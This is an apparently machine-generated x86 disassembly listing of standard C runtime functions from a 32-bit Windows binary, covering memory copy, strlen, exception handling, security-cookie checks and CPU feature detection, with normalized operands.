mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_1003dfb8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_1003e2d0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1003e35b
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
test [ esi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
test [ esi ] 0x8
je r-xdata
mov ecx [ edi ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x18 ]
call [ eax + 0x20 ]
mov [ ebp - 0xc ] 0x1994000
sub_1003e3be
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1003e3f4
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_1003c623
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_100442cd
add esp 0x20
pop esi
pop ebp
retn
sub_1003e425
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_1003c623
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_100442cd
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1003e52b
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1003e6b2
pop ebx
mov esp ebp
pop ebp
retn
sub_1003e4c4
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1003e3f4
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10043570
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_1003e52b
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_1003e425
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_100424a8
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
sub_1003e602
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ eax + 0xc ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] esi
push edi
mov edi esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_100435bc
cmp esi edi
jbe r-xdata
dec esi
imul eax esi 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_100435bc
imul eax esi 0x14
pop edi
pop esi
pop ebx
add eax ecx
mov esp ebp
pop ebp
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_1003e680
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1003e6b2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1003e707
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_100424a8
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_100424a8
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1003e731
push ebp
mov ebp esp
push esi
call sub_100424a8
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_100424a8
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_100424a8
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_100435bc
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_1003e781
push ebp
mov ebp esp
call sub_100424a8
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_1003e7aa
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100442cd
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1003e7ee
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_10044420
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_1003e80c
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003e7e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
pop ecx
sub_1003e8a2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_1003e968
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003e8e2
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_1003e910
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003e910
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_1003e9a6
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_1003e968
jmp r-xdata
sub_1003e943
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e9a6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
pop ecx
sub_1003e968
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_1003e2d0
lea edi [ eax + 0x1 ]
push edi
call sub_1003fc06
mov [ ebx + 0x4 ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_1003d191
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_1003e9cf
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_10045001
push [ ebp + 0x8 ]
call sub_10043515
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_10043500
pop ecx
pop ebp
retn
push 0x1
call sub_10045001
pop ecx
sub_1003ea0c
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_1003e9cf
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_1003eb07
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x1c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ rw-data ] ebx
xor eax eax
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x1c ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x14 ]
xor eax 0x6c65746e
mov [ rw-data ] esi
or ecx eax
mov eax [ ebp - 0x18 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
sbb cl cl
pop eax
inc cl
push 0x0
pop ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x1c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
xor eax eax
push 0x7
xor ecx ecx
lea esi [ ebp - 0x1c ]
pop eax
cpuid
mov [ esi ] eax
mov eax esi
mov esi [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x18 ]
test eax 0x200
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
pop edi
pop esi
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
test ecx 0x8000000
je r-xdata
test ecx 0x100000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jl r-xdata
cmp eax 0x20670
je r-xdata
test ecx __dos_header
je r-xdata
cmp eax 0x30650
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
test al 0x20
je r-xdata
cmp eax 0x30660
je r-xdata
or esi 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] esi
cmp eax 0x30670
jne r-xdata
sub_1003ec80
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1003ecca
push esi
push edi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi [ rw-data ]
mov edi eax
test esi esi
je r-xdata
push ebx
push esi
call sub_1003f3e3
mov esi [ rw-data ]
xor ebx ebx
mov [ rw-data ] ebx
pop ecx
test esi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_1003f3e3
push [ rw-data ]
mov [ rw-data ] ebx
call sub_1003f3e3
push [ rw-data ]
call sub_1003f3e3
or esi 0xffffffff
mov [ rw-data ] ebx
add esp 0xc
mov [ rw-data ] ebx
cmp edi esi
je r-xdata
cmp [ esi ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_1003f3e3
pop ecx
add esi 0x4
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_1003f3e3
pop ecx
add esi 0x4
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov [ rw-data ] ebx
push edi
call sub_1003f3e3
pop ecx
mov eax [ rw-data ]
[ eax ] esi
dec esi
pop ebx
jne r-xdata
push eax
call sub_1003f3e3
pop ecx
mov [ rw-data ] ebx
pop edi
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov [ rw-data ] esi
sub_1003ee02
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10044fe2
push r--data
push r--data
call sub_1003ef08
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10045400
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_1004354b
call sub_1003cdaf
mov [ esp ] r--data
push r--data
call sub_1003eed2
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_10045400
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1003ee9a
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_1003fcbe
push esi
call sub_1003fdf0
push esi
call sub_1003f3d6
push esi
call sub_100454fe
push esi
call sub_1004363b
push esi
call sub_1004570f
add esp 0x18
pop esi
jmp sub_10043267
sub_1003eed2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
sub eax esi
add eax 0x3
shr eax 0x2
cmp [ ebp + 0xc ] esi
push edi
sbb edi edi
not edi
and edi eax
jbe r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
inc ebx
cmp ebx edi
jb r-xdata
call eax
sub_1003ef08
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1003ef3c
push 0x1c
push r--data
call sub_1003f180
push 0x8
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003f056
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1003f1c5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10045173
pop ecx
push [ ebp + 0x8 ]
call sub_1003ecb4
push r--data
push r--data
call sub_1003eed2
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_1003eed2
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_1003f06b
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
pop ebp
retn
sub_1003f09c
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call sub_100434f2
add esi 0x3e8
pop ecx
cmp esi [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100457c7
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1003f0e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call sub_100434f2
mov edi [ rw-data ]
add esi 0x3e8
pop ecx
cmp esi edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_1003fc06
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_1003f12b
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call sub_100434f2
add esi 0x3e8
pop ecx
cmp esi [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004571c
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1003f180
push sub_1003f1e0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1003f1e0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov edi [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor edi [ rw-data ]
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ eax + esi ]
call sub_1003c623
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_1003c623
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
